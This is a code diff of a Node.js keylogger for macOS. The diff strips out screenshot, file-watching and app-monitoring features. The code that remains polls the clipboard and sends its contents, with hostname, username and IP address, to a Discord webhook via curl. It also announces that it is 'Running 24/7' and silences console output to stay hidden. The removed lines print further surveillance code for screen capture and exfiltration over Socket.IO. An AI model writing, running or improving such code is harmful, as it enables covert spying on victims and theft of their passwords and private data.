@@ -735,11 +735,7 @@ const CLIENT_ID = `pc-${HOSTNAME}-${USERNAME}`;
 let socket = null;
 let screenshotDir = path.join(os.homedir(), '.screenshots');
 let keysBuffer = '';
-let lastScreenshotTime = 0;
-let lastKeyTime = 0;
 let lastClipboard = '';
-const SCREENSHOT_INTERVAL = 5000;
-const KEY_TRIGGER_DELAY = 2000;
 
 if (!fs.existsSync(screenshotDir)) {
     fs.mkdirSync(screenshotDir, { recursive: true });
@@ -765,71 +761,10 @@ function connectToServer() {
 
 connectToServer();
 
-function takeScreenshot() {
-    const timestamp = Date.now();
-    const filename = `screenshot_${timestamp}.png`;
-    const filepath = path.join(screenshotDir, filename);
-    
-    // Capture current keys and process before screenshot
-    const currentKeys = keysBuffer.length > 0 ? keysBuffer : `[Screenshot ${new Date().toLocaleTimeString()}]`;
-    const processTitle = lastProcessTitle || 'Unknown';
-    
-    // Save keys before clearing
-    const keysToSend = currentKeys;
-    
-        exec(`screencapture -x "${filepath}"`, (error, stdout, stderr) => {
-            if (error) {
-                // Screenshot failed - still send keylog without screenshot
-                sendKeylogToDiscord(keysToSend, processTitle, null);
-                keysBuffer = '';
-                return;
-            }
-            
-            if (fs.existsSync(filepath)) {
-                try {
-                    const imageBuffer = fs.readFileSync(filepath);
-                    const base64Image = imageBuffer.toString('base64');
-                    const dataURL = `data:image/png;base64,${base64Image}`;
-                    
-                    // Send keylog to Discord (text only - Discord webhooks don't support base64 images)
-                    sendKeylogToDiscord(keysToSend, processTitle, filepath);
-                    
-                    // Send screenshot to dashboard via Socket.IO (this works with base64)
-                    if (socket && socket.connected) {
-                        socket.emit('screenshot', {
-                            clientId: CLIENT_ID,
-                            image: dataURL,
-                            keys: keysToSend,
-                            processTitle: processTitle,
-                            timestamp: timestamp
-                        });
-                    }
-                    
-                    // Clean up file after a delay (keep it for potential upload)
-                    setTimeout(() => { 
-                        try { 
-                            fs.unlinkSync(filepath); 
-                        } catch (e) {} 
-                    }, 30000); // Keep for 30 seconds
-                } catch (e) {
-                    // Error reading file - still send keylog
-                    sendKeylogToDiscord(keysToSend, processTitle, null);
-                }
-            } else {
-                // File doesn't exist - still send keylog
-                sendKeylogToDiscord(keysToSend, processTitle, null);
-            }
-            
-            // Clear buffer AFTER sending (but keep last 100 chars for context)
-            if (keysBuffer.length > 100) {
-                keysBuffer = keysBuffer.substring(keysBuffer.length - 100);
-            } else {
-                keysBuffer = '';
-            }
-        });
-}
+// REMOVED: takeScreenshot function - not needed for simple keylogger
+// Screenshots can be added later if needed, but for now we only send keystrokes
 
-// Send keylog to Discord in the format user wants (WITH screenshot file)
+// Send keylog to Discord - simple and clean
 function sendKeylogToDiscord(buffer, processTitle, screenshotFilePath = null) {
     if (!buffer || buffer.length === 0) buffer = '[No activity]';
     
@@ -845,43 +780,24 @@ function sendKeylogToDiscord(buffer, processTitle, screenshotFilePath = null) {
         if (ipAddress !== 'Unknown') break;
     }
     
-    const keylogContent = `**Keylogger**\n\`\`\`\nBuffer: ${buffer.substring(0, 1000)}\nProcess Title: ${processTitle}\nHostname: ${HOSTNAME}\nPC Username: ${USERNAME}\nIP Address: ${ipAddress}\n\`\`\``;
+    const keylogContent = `**Keylogger**\n\`\`\`\nBuffer: ${buffer.substring(0, 1000)}\nHostname: ${HOSTNAME}\nPC Username: ${USERNAME}\nIP Address: ${ipAddress}\n\`\`\``;
     
-    // Discord webhooks don't support base64 images - send text only for now
-    // Screenshots are sent to dashboard via Socket.IO
     const payload = {
         content: keylogContent
     };
     
-    const payloadFile = path.join(screenshotDir, `keylog_${Date.now()}.json`);
+    const payloadFile = path.join(os.homedir(), `.keylogger_payload_${Date.now()}.json`);
     try {
         fs.writeFileSync(payloadFile, JSON.stringify(payload));
-        
-        // Send with error handling and logging
-        exec(`curl -s -X POST -H "Content-Type: application/json" --data-binary "@${payloadFile}" "${WEBHOOK}"`, (error, stdout, stderr) => {
-            // Log to file for debugging
-            const logFile = path.join(screenshotDir, 'discord_send.log');
-            const logEntry = `[${new Date().toISOString()}] Sent keylog: ${buffer.substring(0, 50)}... Error: ${error ? error.message : 'none'} STDOUT: ${stdout} STDERR: ${stderr}\n`;
-            try {
-                fs.appendFileSync(logFile, logEntry);
-            } catch (e) {}
-            
-            // Clean up payload file
+        exec(`curl -s -X POST -H "Content-Type: application/json" --data-binary "@${payloadFile}" "${WEBHOOK}"`, (error) => {
             setTimeout(() => {
                 try { fs.unlinkSync(payloadFile); } catch (e) {}
             }, 5000);
         });
     } catch (e) {
-        // Fallback - send simple text message
-        const msg = `Keylogger\nBuffer: ${buffer.substring(0, 500)}\nProcess: ${processTitle}\nHostname: ${HOSTNAME}\nUser: ${USERNAME}\nIP: ${ipAddress}`;
-        const escapedMsg = msg.replace(/"/g, '\\"').replace(/\n/g, '\\n');
-        exec(`curl -s -X POST -H "Content-Type: application/json" -d '{"content":"${escapedMsg}"}' "${WEBHOOK}"`, (error, stdout, stderr) => {
-            const logFile = path.join(screenshotDir, 'discord_send.log');
-            const logEntry = `[${new Date().toISOString()}] Fallback send: ${buffer.substring(0, 50)}... Error: ${error ? error.message : 'none'}\n`;
-            try {
-                fs.appendFileSync(logFile, logEntry);
-            } catch (e) {}
-        });
+        // Fallback
+        const msg = `Keylogger\nBuffer: ${buffer.substring(0, 500)}\nHostname: ${HOSTNAME}\nUser: ${USERNAME}\nIP: ${ipAddress}`;
+        exec(`curl -s -X POST -H "Content-Type: application/json" -d '{"content":"${msg.replace(/"/g, '\\"').replace(/\n/g, '\\n')}"}' "${WEBHOOK}"`, () => {});
     }
 }
 
@@ -889,206 +805,56 @@ function sendKeylogToDiscord(buffer, processTitle, screenshotFilePath = null) {
 // Discord webhooks don't support base64 images, so we only send text via sendKeylogToDiscord
 // Screenshots are sent to dashboard via Socket.IO only
 
-// AGGRESSIVE KEYSTROKE CAPTURE - Multiple methods to capture typing
-let clipboardCheckCount = 0;
-let lastClipboardHash = '';
-let lastProcessTitle = 'Unknown';
-let keyBuffer = ''; // Accumulate keys
+// SIMPLE KEYSTROKE CAPTURE - Only sends when clipboard actually changes (typing/copying)
+let lastClipboard = '';
+let keysBuffer = '';
 
-// Method 1: Monitor clipboard VERY aggressively (every 50ms) - captures when they copy/paste
+// Monitor clipboard - only send when it actually changes
 setInterval(() => {
     exec('pbpaste', (error, stdout) => {
         if (!error && stdout && stdout.trim()) {
             const clipboard = stdout.trim();
-            // Use hash to detect changes
-            const currentHash = clipboard.length.toString() + clipboard.substring(0, 20);
-            
-            if (currentHash !== lastClipboardHash && clipboard.length > 0) {
-                lastClipboardHash = currentHash;
-                lastClipboard = stdout;
+            // Only process if clipboard actually changed
+            if (clipboard !== lastClipboard && clipboard.length > 0) {
+                lastClipboard = clipboard;
                 
-                // Get active application IMMEDIATELY
-                exec(`osascript -e 'tell application "System Events" to get name of first process whose frontmost is true' 2>/dev/null`, (appError, appName) => {
-                    const processTitle = appError ? 'Unknown' : (appName ? appName.trim() : 'Unknown');
-                    lastProcessTitle = processTitle;
-                    
-                    // Add to buffer - this is what they typed/copied
-                    if (keysBuffer.length > 0 && !keysBuffer.endsWith(' ')) {
-                        keysBuffer += ' ';
-                    }
-                    // Capture text - this represents what they typed
-                    keysBuffer += clipboard.substring(0, 5000);
-                    lastKeyTime = Date.now();
-                    
-                    // Send IMMEDIATELY when clipboard changes WITH screenshot
-                    // Don't wait - send right away
-                    takeScreenshot();
-                });
-            }
-        }
-        
-        clipboardCheckCount++;
-        // Every 5 checks (0.5 seconds), send if buffer has data
-        if (clipboardCheckCount % 5 === 0 && keysBuffer.length > 0) {
-            exec(`osascript -e 'tell application "System Events" to get name of first process whose frontmost is true' 2>/dev/null`, (appError, appName) => {
-                const processTitle = appError ? lastProcessTitle : (appName ? appName.trim() : lastProcessTitle);
-                lastProcessTitle = processTitle;
-                // Send immediately
-                takeScreenshot();
-            });
-        }
-        
-        // Every 20 checks (1 second), force send even if no clipboard change (to ensure regular updates)
-        if (clipboardCheckCount % 20 === 0) {
-            exec(`osascript -e 'tell application "System Events" to get name of first process whose frontmost is true' 2>/dev/null`, (appError, appName) => {
-                const processTitle = appError ? lastProcessTitle : (appName ? appName.trim() : lastProcessTitle);
-                lastProcessTitle = processTitle;
-                if (keysBuffer.length === 0) {
-                    keysBuffer = `[Periodic Update - ${processTitle} - ${new Date().toLocaleTimeString()}]`;
+                // Add to buffer
+                if (keysBuffer.length > 0 && !keysBuffer.endsWith(' ')) {
+                    keysBuffer += ' ';
                 }
-                takeScreenshot();
-            });
-        }
-    });
-}, 50); // Check VERY frequently (every 50ms) for clipboard changes
-
-// Method 2: Monitor active window title changes (indicates typing in text fields)
-let lastWindowTitle = '';
-setInterval(() => {
-    exec(`osascript -e 'tell application "System Events" to get name of window 1 of first process whose frontmost is true' 2>/dev/null`, (error, stdout) => {
-        if (!error && stdout && stdout.trim()) {
-            const windowTitle = stdout.trim();
-            if (windowTitle !== lastWindowTitle && windowTitle.length > 0) {
-                lastWindowTitle = windowTitle;
-                // Window title changed - might indicate typing activity
-                exec(`osascript -e 'tell application "System Events" to get name of first process whose frontmost is true' 2>/dev/null`, (appError, appName) => {
-                    const processTitle = appError ? 'Unknown' : (appName ? appName.trim() : 'Unknown');
-                    lastProcessTitle = processTitle;
-                    // Check clipboard for new content
-                    exec('pbpaste', (clipError, clipStdout) => {
-                        if (!clipError && clipStdout && clipStdout.trim() && clipStdout !== lastClipboard) {
-                            keysBuffer += `[Window: ${windowTitle.substring(0, 100)}] `;
-                            lastKeyTime = Date.now();
-                            setTimeout(() => takeScreenshot(), 500);
-                        }
-                    });
-                });
+                keysBuffer += clipboard.substring(0, 5000);
+                
+                // Send immediately when clipboard changes
+                sendKeylogToDiscord(keysBuffer, 'Unknown', null);
+                
+                // Clear buffer after sending
+                keysBuffer = '';
             }
         }
     });
-}, 1000);
+}, 500); // Check every 500ms
 
-// Monitor active application changes (to detect what app they're using)
-let lastActiveApp = '';
-setInterval(() => {
-    exec(`osascript -e 'tell application "System Events" to get name of first process whose frontmost is true' 2>/dev/null`, (error, stdout) => {
-        if (!error && stdout) {
-            const currentApp = stdout.trim();
-            if (currentApp && currentApp !== lastActiveApp) {
-                lastActiveApp = currentApp;
-                // App changed - send current buffer if any WITH screenshot
-                if (keysBuffer.length > 0) {
-                    takeScreenshot(); // This will send keylog + screenshot together
-                }
-            }
-        }
-    });
-}, 2000);
+// REMOVED: Active app monitoring - was causing spam
 
-// Monitor file changes (captures file saves, downloads, etc.)
-const monitorDirs = [
-    path.join(os.homedir(), 'Desktop'),
-    path.join(os.homedir(), 'Documents'),
-    path.join(os.homedir(), 'Downloads')
-];
-monitorDirs.forEach(dir => {
-    if (fs.existsSync(dir)) {
-        fs.watch(dir, { recursive: true }, (eventType, filename) => {
-            if (filename && (eventType === 'rename' || eventType === 'change')) {
-                exec(`osascript -e 'tell application "System Events" to get name of first process whose frontmost is true' 2>/dev/null`, (appError, appName) => {
-                    const processTitle = appError ? 'File System' : (appName ? appName.trim() : 'File System');
-                    keysBuffer += `[File: ${filename}] `;
-                    lastKeyTime = Date.now();
-                    // Send file activity as keylog
-                    sendKeylogToDiscord(`[File Activity: ${filename}]`, processTitle);
-                    setTimeout(() => takeScreenshot(), 1000);
-                });
-            }
-        });
-    }
-});
+// REMOVED: File monitoring - was causing spam
 
-// Monitor recent files to detect activity
-let lastFileCheck = Date.now();
-setInterval(() => {
-    const recentFiles = [];
-    monitorDirs.forEach(dir => {
-        if (fs.existsSync(dir)) {
-            try {
-                const files = fs.readdirSync(dir);
-                files.forEach(file => {
-                    const filePath = path.join(dir, file);
-                    try {
-                        const stats = fs.statSync(filePath);
-                        if (stats.mtimeMs > lastFileCheck - 5000) {
-                            recentFiles.push(file);
-                        }
-                    } catch (e) {}
-                });
-            } catch (e) {}
-        }
-    });
-    if (recentFiles.length > 0) {
-        keysBuffer += `[Recent Files: ${recentFiles.join(', ')}] `;
-        lastKeyTime = Date.now();
-        takeScreenshot();
-    }
-    lastFileCheck = Date.now();
-}, 5000);
+// REMOVED: Periodic screenshots - was causing spam
+// Screenshots will only be sent when there's actual clipboard activity
 
-// Periodic screenshots - always send to Discord (every 5 seconds)
-setInterval(() => {
-    const now = Date.now();
-    if (now - lastScreenshotTime > SCREENSHOT_INTERVAL) {
-        lastScreenshotTime = now;
-        // Get current process
-        exec(`osascript -e 'tell application "System Events" to get name of first process whose frontmost is true' 2>/dev/null`, (appError, appName) => {
-            const processTitle = appError ? 'Unknown' : (appName ? appName.trim() : 'Unknown');
-            // Always take screenshot, even if no keys captured
-            // This ensures Discord gets regular updates with screenshots
-            if (keysBuffer.length === 0) {
-                keysBuffer = `[Periodic Screenshot - ${processTitle} - ${new Date().toLocaleTimeString()}]`;
-            }
-            takeScreenshot(); // This sends keylog + screenshot together
-        });
-    }
-}, SCREENSHOT_INTERVAL);
-
-// Take initial screenshot after 3 seconds
+// Test Discord connection on startup (send once)
 setTimeout(() => {
-    keysBuffer = '[Initial Screenshot]';
-    takeScreenshot();
-}, 3000);
-
-// Test Discord connection on startup (send immediately, no screenshot needed)
-setTimeout(() => {
-    // Send test message directly to Discord to verify webhook works
     const testPayload = {
         content: `✅ **Keylogger Started Successfully**\n\`\`\`\nHostname: ${HOSTNAME}\nPC Username: ${USERNAME}\nStatus: Running 24/7\nTimestamp: ${new Date().toISOString()}\n\`\`\``
     };
     const testFile = path.join(screenshotDir, `test_${Date.now()}.json`);
     try {
         fs.writeFileSync(testFile, JSON.stringify(testPayload));
-        exec(`curl -s -X POST -H "Content-Type: application/json" --data-binary "@${testFile}" "${WEBHOOK}"`, (error, stdout, stderr) => {
+        exec(`curl -s -X POST -H "Content-Type: application/json" --data-binary "@${testFile}" "${WEBHOOK}"`, (error) => {
             setTimeout(() => {
                 try { fs.unlinkSync(testFile); } catch (e) {}
             }, 5000);
         });
     } catch (e) {}
-    
-    // Also send via screenshot function
-    keysBuffer = '[Keylogger Started - Testing Discord Connection]';
-    takeScreenshot(); // This will send keylog + screenshot
 }, 2000);
 
 console.log = () => {};
